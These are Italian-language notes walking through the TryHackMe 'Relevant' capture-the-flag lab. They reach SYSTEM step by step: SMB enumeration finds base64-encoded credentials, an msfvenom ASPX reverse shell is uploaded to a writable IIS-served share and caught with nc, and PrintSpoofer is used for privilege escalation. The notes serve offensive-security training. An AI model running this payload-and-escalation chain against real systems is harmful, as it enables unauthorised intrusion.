
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/relevant

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.37.51 -oG risultatoscan
```

```
sudo nmap -sC -sV -p80,135,139,445,3389,49663,49667,49669 10.10.37.51 -oN risultatoscan2
```


==enumerare con wfuzz==

```
wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.37.51/FUZZ
```

==Controllare servizio Samba presente porta 139,445==

```
smbclient -L 10.10.37.51
```
	(enter su richiesta pw che non abbiamo)
troviamo vari sharename troviamo solo la connessione accettata a IPC$ e nt4wrksv
```
smbclient //10.10.37.51/IPC$
```
facciamo dir ma niente ora proviamo
```
smbclient //10.10.127.9/nt4wrksv
```
dir e troviamo file password

```
get passwords.txt
```

troviamo
```
cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk      
```
andiamo su 
```
https://gchq.github.io/CyberChef/
```
mettiamo in input
```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
```
==Mettiamo== il metodo ==Magic== in ==Recipe==
otteniamo in ==Output
```
Bob - !P@$$W0rD!123
```
per
```
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
otteniamo
```
Bill - Juw4nnaM4n420696969!$$$
```

proviamo a connetterci sulla porta 3389 rdp ma prima vediamose lo abbiamo installato

```
dpkg -l | grep rdp
```

```
xfreerdp /u:RELEVANT\Bill /p:'Juw4nnaM4n420696969!$$$' /v:10.10.127.9:3389
```

```
xfreerdp /u:RELEVANT\Bob /p:'!P@$$W0rD!123' /v:10.10.127.9:3389
```
ci da errore  certificato, proviamo un altra strada

vediamo se la risorsa trovata prima con samba è condivisa sui due siti http porta 80 e 49663
==dal browser==
```
http://10.10.127.9:49663/nt4wrksv/
```
F12>Network e vediamo che ci da il GET con stato 200 quindi è condivisa
possiamo UPLODARE un file!

```
nano test1.txt  
```
```
Ciao,ciao
```

```
smbclient //10.10.127.9/nt4wrksv
```
uplodiamo
```
 put test1.txt
```

```
http://10.10.127.9:49663/nt4wrksv/test1.txt
```
e vediamo la  scritta Ciao,ciao
ora troviamo reverse shell per server IIS

```
https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1
```

```
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
```

```
cd Downloads
```

```
nano shell.aspx
```
```
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=10.21.9.220 LPORT=443 -e x64/shikata_ga_nai -o shell.aspx
```

```
sudo msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=10.21.9.220 LPORT=443 -e x64/shikata_ga_nai -o shell.aspx
```

```
smbclient //10.10.170.18/nt4wrksv
```

```
put shell.aspx
```
usciamo
```
sudo nc -lvnp 443
```

```
curl http://10.10.170.18:49663/nt4wrksv/shell.aspx
```
==Ottenuta la reverse shell!==

==Scalata dei privilegi  in Windows==
```
whoami /priv
```
SeImpersonatePrivilege è Abilitato
troviamo info su
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
```
scarichiamo il PrintSpoofer compilato da
```
https://github.com/dievus/printspoofer
```

```
smbclient //10.10.170.18/nt4wrksv
```

```
put PrintSpoofer.exe
```
==cerchiamo dove si trova dalla reverse shell==
```
cd /
```

```
dir PrintSpoofer.exe /s /p
```

```
c:\inetpub\wwwroot\nt4wrksv
```

```
cd c:\inetpub\wwwroot\nt4wrksv
```

```
PrintSpoofer.exe -i -c cmd
```

==whoami==
==nt authority\system(siamo amministratori)==

```
cd \Users\Bob\Desktop
```

```
type user.txt
```
```
THM{xxxxxxxxxxxxx}
```

```
cd Users\Administrator\Desktop
```

```
type root.txt
```

```
THM{xxxxxxxxxxxxx}
```